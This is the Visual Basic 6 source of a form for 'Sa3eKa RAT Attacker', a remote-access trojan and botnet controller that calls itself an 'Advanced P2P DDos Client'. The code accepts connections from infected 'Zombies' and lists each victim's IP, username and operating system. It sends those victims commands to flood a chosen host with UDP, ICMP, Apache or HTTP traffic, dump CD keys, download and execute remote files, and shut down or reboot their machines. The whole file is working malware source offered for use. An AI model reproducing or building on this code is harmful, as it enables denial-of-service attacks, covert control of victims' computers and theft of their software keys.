VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BackColor       =   &H8000000A&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Sa3eKa RAT Attacker        lll By HACKER85 lll"
   ClientHeight    =   5850
   ClientLeft      =   150
   ClientTop       =   840
   ClientWidth     =   10575
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   6.75
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   Picture         =   "Form1.frx":0442
   ScaleHeight     =   5850
   ScaleWidth      =   10575
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text2 
      Height          =   255
      Left            =   8880
      TabIndex        =   19
      Text            =   "ID"
      Top             =   4200
      Visible         =   0   'False
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   255
      Left            =   10680
      TabIndex        =   18
      Text            =   "1"
      Top             =   2400
      Visible         =   0   'False
      Width           =   375
   End
   Begin VB.TextBox cnclient 
      Height          =   255
      Left            =   10680
      TabIndex        =   11
      Text            =   "5000"
      Top             =   2760
      Visible         =   0   'False
      Width           =   495
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Send Command"
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   1680
      TabIndex        =   9
      Top             =   5040
      Width           =   3375
   End
   Begin VB.CommandButton Command3 
      Appearance      =   0  'Flat
      Caption         =   "Stop Command"
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   5160
      TabIndex        =   8
      Top             =   5040
      Width           =   3135
   End
   Begin VB.Timer Timer1 
      Interval        =   300
      Left            =   10800
      Top             =   5280
   End
   Begin VB.TextBox Text5 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   6360
      TabIndex        =   4
      Text            =   "20000"
      Top             =   4440
      Width           =   735
   End
   Begin VB.TextBox Text8 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   4920
      TabIndex        =   3
      Text            =   "3074"
      Top             =   4440
      Width           =   495
   End
   Begin VB.TextBox Text7 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   1680
      TabIndex        =   2
      Text            =   "IP Here"
      Top             =   4440
      Width           =   3135
   End
   Begin VB.TextBox Text4 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   5520
      MaxLength       =   3
      TabIndex        =   1
      Text            =   "100"
      Top             =   4440
      Width           =   735
   End
   Begin VB.ComboBox Combo1 
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   300
      Left            =   7320
      TabIndex        =   0
      Text            =   "UDP"
      Top             =   4440
      Width           =   975
   End
   Begin VB.Timer Timer 
      Interval        =   300
      Left            =   10800
      Top             =   4560
   End
   Begin MSComctlLib.ImageList Image 
      Left            =   10680
      Top             =   3120
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   2
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":C283C
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":C324E
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin MSWinsockLib.Winsock Zombies 
      Index           =   0
      Left            =   10800
      Top             =   3960
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Listen 
      Left            =   10320
      Top             =   6120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSComctlLib.ListView ListView1 
      Height          =   3735
      Left            =   0
      TabIndex        =   5
      Top             =   0
      Width           =   10575
      _ExtentX        =   18653
      _ExtentY        =   6588
      View            =   3
      LabelEdit       =   1
      MultiSelect     =   -1  'True
      LabelWrap       =   -1  'True
      HideSelection   =   0   'False
      FullRowSelect   =   -1  'True
      GridLines       =   -1  'True
      PictureAlignment=   4
      _Version        =   393217
      SmallIcons      =   "Image"
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MouseIcon       =   "Form1.frx":C40A0
      NumItems        =   6
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "IP Address (0 Zombies)"
         Object.Width           =   3704
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Alignment       =   2
         SubItemIndex    =   1
         Text            =   "Status (0 Commands Sent)"
         Object.Width           =   4410
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Alignment       =   2
         SubItemIndex    =   2
         Text            =   "Version"
         Object.Width           =   1235
      EndProperty
      BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Alignment       =   2
         SubItemIndex    =   3
         Text            =   "Country"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(5) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Alignment       =   2
         SubItemIndex    =   4
         Text            =   "Username@PC"
         Object.Width           =   2646
      EndProperty
      BeginProperty ColumnHeader(6) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Alignment       =   2
         SubItemIndex    =   5
         Text            =   "Operating System"
         Object.Width           =   3969
      EndProperty
      Picture         =   "Form1.frx":C4EF2
   End
   Begin VB.Label Label7 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Registered to:<WwW.Sa3eKa.CoM>"
      DragIcon        =   "Form1.frx":C8C5A
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   5400
      MouseIcon       =   "Form1.frx":C909C
      TabIndex        =   17
      Top             =   5640
      Width           =   2895
   End
   Begin VB.Label Label6 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Welcome to Sa3eka - Advanced P2P DDos Client"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   1680
      TabIndex        =   16
      Top             =   5640
      Width           =   3735
   End
   Begin VB.Label Label5 
      BackStyle       =   0  'Transparent
      Caption         =   "Type"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   7440
      TabIndex        =   15
      Top             =   4200
      Width           =   495
   End
   Begin VB.Label Label3 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "Packets"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   6360
      TabIndex        =   14
      Top             =   4200
      Width           =   735
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Sockets"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   5520
      TabIndex        =   13
      Top             =   4200
      Width           =   615
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "Host"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   1800
      TabIndex        =   12
      Top             =   4200
      Width           =   735
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   "Port"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   4920
      TabIndex        =   10
      Top             =   4200
      Width           =   495
   End
   Begin VB.Label Label12 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Listening on Port 3176.."
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   1680
      TabIndex        =   7
      Top             =   3720
      Width           =   3975
   End
   Begin VB.Label Label11 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Selected: 0"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   5640
      TabIndex        =   6
      Top             =   3720
      Width           =   2655
   End
   Begin VB.Line Line2 
      X1              =   6000
      X2              =   6000
      Y1              =   0
      Y2              =   600
   End
   Begin VB.Line Line1 
      X1              =   0
      X2              =   6240
      Y1              =   0
      Y2              =   0
   End
   Begin VB.Menu fle 
      Caption         =   "File"
      Begin VB.Menu Build 
         Caption         =   "Build Server"
      End
      Begin VB.Menu asdgas 
         Caption         =   "-"
      End
      Begin VB.Menu exit 
         Caption         =   "Exit"
      End
   End
   Begin VB.Menu Commands 
      Caption         =   "Commands"
      Begin VB.Menu Fun 
         Caption         =   "Fun Commands"
         Begin VB.Menu Chat 
            Caption         =   "Chat"
         End
         Begin VB.Menu asfa 
            Caption         =   "-"
         End
         Begin VB.Menu WEb 
            Caption         =   "Website Viewer"
         End
         Begin VB.Menu asdg 
            Caption         =   "-"
         End
         Begin VB.Menu HideTask 
            Caption         =   "Hide TaskBar"
         End
         Begin VB.Menu ShowTask 
            Caption         =   "Show TaskBar"
         End
         Begin VB.Menu sdfaa 
            Caption         =   "-"
         End
         Begin VB.Menu ShutDown 
            Caption         =   "Shutdown"
         End
         Begin VB.Menu Reboot 
            Caption         =   "Reboot"
         End
         Begin VB.Menu asdgads 
            Caption         =   "-"
         End
         Begin VB.Menu HideDesk 
            Caption         =   "Hide Desktop Icons"
         End
         Begin VB.Menu ShowDesk 
            Caption         =   "Show Desktop Icons"
         End
      End
      Begin VB.Menu FunMenu 
         Caption         =   "Fun Commands[2]"
         Begin VB.Menu CDTray 
            Caption         =   "Open/Close CD Tray"
         End
      End
      Begin VB.Menu CDKeys 
         Caption         =   "Dump CDKeys"
      End
      Begin VB.Menu Download 
         Caption         =   "Remote Download/Execute"
      End
      Begin VB.Menu sdf 
         Caption         =   "-"
      End
      Begin VB.Menu Uninstall 
         Caption         =   "Uninstall"
      End
   End
   Begin VB.Menu About 
      Caption         =   "About/Credits"
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim data(1 To 600) As String
Dim sent As Integer
Dim checkeditem As Integer
Dim f As Integer
Private Type ddos
string2 As String
End Type
Private Const LVM_FIRST As Long = &H1000
Private Const LVM_HITTEST As Long = (LVM_FIRST + 18)
Private Const LVM_SUBITEMHITTEST As Long = (LVM_FIRST + 57)
Private Const LVHT_ONITEMICON As Long = &H2
Private Const LVHT_ONITEMLABEL As Long = &H4
Private Const LVHT_ONITEMSTATEICON As Long = &H8
Private Const LVHT_ONITEM As Long = (LVHT_ONITEMICON Or LVHT_ONITEMLABEL Or LVHT_ONITEMSTATEICON)
Private Type POINTAPI
  X As Long
  Y As Long
End Type
Private Type LVHITTESTINFO
   pt As POINTAPI
   flags As Long
   iItem As Long
   iSubItem As Long
End Type
Private Declare Function SendMessage Lib "User32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long


Private Sub About_Click()
Form3.Show
End Sub
Private Sub Build_Click()
Build1.Show
End Sub


Private Sub CDKeys_Click()
Form5.Show
End Sub

Private Sub CDTray_Click()
Dim pckt$
sent = 0
For i = 1 To ListView1.ListItems.Count
If ListView1.ListItems.Item(i).Selected = True Then
pckt$ = "Tray"
If Zombies(i).State = 7 Then
Zombies(i).SendData pckt$
sent = sent + 1
ListView1.ColumnHeaders(2).text = "Status (" & sent & " Commands Sent)"


End If
End If
DoEvents
Next i
End Sub

Private Sub Download_Click()
Form4.Show
End Sub

Private Sub Form_Terminate()
Unload Me
End Sub

Private Sub ListView1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Dim i As Integer
    If Button = vbRightButton Then
        Dim HTI As LVHITTESTINFO
        Index = 0
        Dim curritem As Long
        
        With HTI
             .pt.X = (X \ Screen.TwipsPerPixelX)
             .pt.Y = (Y \ Screen.TwipsPerPixelY)
             .flags = LVHT_ONITEM
        End With
        
        Call SendMessage(ListView1.hWnd, LVM_SUBITEMHITTEST, 0, HTI)
        
        Dim lst As ListItem
           If (HTI.iItem > -1) Then
            curritem = HTI.iItem
            ListView1.ListItems.Item(curritem + 1).Selected = True
            PopupMenu Commands
           End If
    End If
End Sub

Public Sub aaa_Click()

End Sub

Public Sub Chat_Click()
frmMain.Show
End Sub

Public Sub ChatEnd_Click()
Dim pckt$
sent = 0
For i = 1 To ListView1.ListItems.Count
If ListView1.ListItems.Item(i).Selected = True Then
pckt$ = "Endit"
If Zombies(i).State = 7 Then
Zombies(i).SendData pckt$
sent = sent + 1
ListView1.ColumnHeaders(2).text = "Status (" & sent & " Commands Sent)"


End If
End If
DoEvents
Next i
End Sub

Public Sub Command2_Click()
Dim i As Integer
For i = 1 To ListView1.ListItems.Count
If ListView1.ListItems.Item(i).Selected = False Then
ListView1.ListItems.Item(i).Selected = True
Label11.Caption = "Selected: " & i
End If
Next i
On Error Resume Next
Dim pckt$
sent = 0
For i = 1 To ListView1.ListItems.Count
If ListView1.ListItems.Item(i).Selected = True Then
ListView1.ListItems.Item(i).SubItems(1) = "Waiting For Reply..."
If Combo1.text = "UDP" Then pckt$ = "UDP" & "^" & Text4.text & "*" & Text7.text & ":" & Text8.text & "#" & Text5.text & "/"
If Combo1.text = "ICMP" Then pckt$ = "ICMP" & "*" & Text7.text & "#" & Text5.text & "/"
If Combo1.text = "Apache" Then pckt$ = "Apache" & "^" & Text4.text & "*" & Text7.text & ":" & Text8.text & "#" & Text5.text & "/"
If Combo1.text = "HTTP" Then pckt$ = "HTTP" & "^" & Text4.text & "*" & Text7.text & "/"
If Zombies(i).State = 7 Then
Zombies(i).SendData pckt$
sent = sent + 1
ListView1.ColumnHeaders(2).text = "Status (" & sent & " Commands Sent)"


End If
End If
DoEvents
Next i
End Sub

Public Sub Command3_Click()
On Error Resume Next
Dim i As Integer
For i = 1 To ListView1.ListItems.Count
If ListView1.ListItems.Item(i).Selected = False Then
ListView1.ListItems.Item(i).Selected = True
Label11.Caption = "Selected: " & i
End If
Next i
Dim pckt$
sent = 0
For i = 1 To ListView1.ListItems.Count
If ListView1.ListItems.Item(i).Selected = True Then
ListView1.ListItems.Item(i).SubItems(1) = "Waiting For Reply..."
pckt$ = "STOP"
If Zombies(i).State = 7 Then
Zombies(i).SendData pckt$
sent = sent + 1
ListView1.ColumnHeaders(2).text = "Status (" & sent & " Commands Sent)"
If ListView1.ListItems.Item(i).Selected = True Then
ListView1.ListItems.Item(i).Selected = False
End If
Label11.Caption = "Selected: 0"
End If
End If
DoEvents
Next i
End Sub

Private Sub HideDesk_Click()
Dim pckt$
sent = 0
For i = 1 To ListView1.ListItems.Count
If ListView1.ListItems.Item(i).Selected = True Then
ListView1.ListItems.Item(i).Checked = True
pckt$ = "DeskHide"
If Zombies(i).State = 7 Then
Zombies(i).SendData pckt$
sent = sent + 1
ListView1.ColumnHeaders(2).text = "Status (" & sent & " Commands Sent)"
End If
End If
DoEvents
Next i
End Sub

Public Sub exit_Click()
End
End Sub
Public Sub Form_Load()
Dim i As Integer
ListView1.FullRowSelect = True
With Listen
.Close
.LocalPort = "3176"
.Listen
End With
 For i = 1 To cnclient.text
  Load Zombies(i)
  Zombies(i).Close
 Next i
Combo1.AddItem "UDP"
Combo1.AddItem "ICMP"
Combo1.AddItem "Apache"
Combo1.AddItem "HTTP"

checkeditem = 0

End Sub

Public Sub Command1_Click()
Dim i As Integer
For i = 1 To ListView1.ListItems.Count
If ListView1.ListItems.Item(i).Selected = False Then
ListView1.ListItems.Item(i).Selected = True
Label11.Caption = "Selected: " & i
End If
Next i
End Sub

Public Sub Label10_Click()

End Sub

Public Sub Command4_Click()
Dim i As Integer
For i = 1 To ListView1.ListItems.Count
If ListView1.ListItems.Item(i).Selected = True Then
ListView1.ListItems.Item(i).Selected = False
End If
Next i
Label11.Caption = "Selected: 0"
End Sub

Private Sub HideTask_Click()
Dim pckt$
sent = 0
For i = 1 To ListView1.ListItems.Count
If ListView1.ListItems.Item(i).Selected = True Then
pckt$ = "HideTask"
If Zombies(i).State = 7 Then
Zombies(i).SendData pckt$
sent = sent + 1
ListView1.ColumnHeaders(2).text = "Status (" & sent & " Commands Sent)"


End If
End If
DoEvents
Next i
End Sub
Public Sub Listen_ConnectionRequest(ByVal requestID As Long)
Dim i As Integer
 For i = 1 To ListView1.ListItems.Count
  If Listen.RemoteHostIP = Split(ListView1.ListItems.Item(i).text, ": ")(1) Then Exit Sub
 Next i
  
For i = 1 To Zombies.UBound
 If Zombies(i).State <> 7 Then
 With Zombies(i)
 .Close
 .Accept requestID
 ListView1.ListItems.Add , , i & ": " & Listen.RemoteHostIP, , 1
 Label12.Caption = "Latest Zombie to Join Botnet - " & Listen.RemoteHostIP

  End With
 Exit Sub
 End If
Next i
End Sub

Public Sub Mudkips_Click()
Dim pckt$
sent = 0
For i = 1 To ListView1.ListItems.Count
If ListView1.ListItems.Item(i).Selected = True Then
pckt$ = "Mudkip"
If Zombies(i).State = 7 Then
Zombies(i).SendData pckt$
sent = sent + 1
ListView1.ColumnHeaders(2).text = "Status (" & sent & " Commands Sent)"


End If
End If
DoEvents
Next i
End Sub


Private Sub Reboot_Click()
Dim pckt$
sent = 0
For i = 1 To ListView1.ListItems.Count
If ListView1.ListItems.Item(i).Selected = True Then
pckt$ = "Reboot"
If Zombies(i).State = 7 Then
Zombies(i).SendData pckt$
sent = sent + 1
ListView1.ColumnHeaders(2).text = "Status (" & sent & " Commands Sent)"


End If
End If
DoEvents
Next i
End Sub

Private Sub ShowDesk_Click()
Dim pckt$
sent = 0
For i = 1 To ListView1.ListItems.Count
If ListView1.ListItems.Item(i).Selected = True Then
pckt$ = "DeskShow"
If Zombies(i).State = 7 Then
Zombies(i).SendData pckt$
sent = sent + 1
ListView1.ColumnHeaders(2).text = "Status (" & sent & " Commands Sent)"


End If
End If
DoEvents
Next i
End Sub

Private Sub ShowTask_Click()
Dim pckt$
sent = 0
For i = 1 To ListView1.ListItems.Count
If ListView1.ListItems.Item(i).Selected = True Then
pckt$ = "ShowTask"
If Zombies(i).State = 7 Then
Zombies(i).SendData pckt$
sent = sent + 1
ListView1.ColumnHeaders(2).text = "Status (" & sent & " Commands Sent)"


End If
End If
DoEvents
Next i
End Sub

Private Sub ShutDown_Click()
Dim pckt$
sent = 0
For i = 1 To ListView1.ListItems.Count
If ListView1.ListItems.Item(i).Selected = True Then
pckt$ = "Shutdown"
If Zombies(i).State = 7 Then
Zombies(i).SendData pckt$
sent = sent + 1
ListView1.ColumnHeaders(2).text = "Status (" & sent & " Commands Sent)"


End If
End If
DoEvents
Next i
End Sub

Public Sub Timer1_Timer()
ListView1.ColumnHeaders(1).text = "Ip Address ( " & ListView1.ListItems.Count & " Zombies)"
End Sub

Public Sub Uninstall_Click()
Dim pckt$
sent = 0
For i = 1 To ListView1.ListItems.Count
If ListView1.ListItems.Item(i).Selected = True Then
pckt$ = "Uninstall"
If Zombies(i).State = 7 Then
Zombies(i).SendData pckt$
sent = sent + 1
ListView1.ColumnHeaders(2).text = "Status (" & sent & " Commands Sent)"

End If
End If
DoEvents
Next i
End Sub

Private Sub Web_Click()
Dim i As Integer
Dim pckt$
sent = 0
For i = 1 To ListView1.ListItems.Count
If ListView1.ListItems.Item(i).Selected = True Then
Form2.Show
End If
DoEvents
Next i
End Sub

Private Sub WEb2_Click()

End Sub

Public Sub Zombies_Close(Index As Integer)
Dim i As Integer
 For i = 1 To ListView1.ListItems.Count
If Zombies(Index).RemoteHostIP = Split(ListView1.ListItems.Item(i).text, ": ")(1) Then
ListView1.ListItems.Remove (i)
Zombies(Index).Close
Exit For
End If
Next i
End Sub

Public Sub Zombies_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Zombies(Index).GetData data(Index)
Debug.Print data(Index)
Dim i As Integer
 For i = 1 To ListView1.ListItems.Count
 Dim X As Integer
 For X = 1 To ListView1.ListItems.Count
 If Index = Split(ListView1.ListItems.Item(X).text, ": ")(0) Then
  If InStr(data(Index), " | ") Then
  ListView1.ListItems.Item(X).SubItems(1) = Split(data(Index), " |")(0)
  ListView1.ListItems.Item(X).SubItems(2) = Split(data(Index), " | ")(1)
  ListView1.ListItems.Item(X).SubItems(3) = Split(data(Index), " | ")(2)
  ListView1.ListItems.Item(X).SubItems(4) = Split(data(Index), " | ")(3)
  ListView1.ListItems.Item(X).SubItems(5) = Split(data(Index), " | ")(4)
    Else
  ListView1.ListItems.Item(X).SubItems(1) = data(Index)
  End If
  
  End If
  Next X
  
  Exit Sub
 Next i
End Sub

Public Sub Zombies_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Dim i As Integer
For i = 1 To ListView1.ListItems.Count
If Zombies(Index).RemoteHostIP = Split(ListView1.ListItems.Item(i).text, ": ")(1) Then
ListView1.ListItems.Remove (i)
Zombies(Index).Close
Exit For
End If
Next i
End Sub
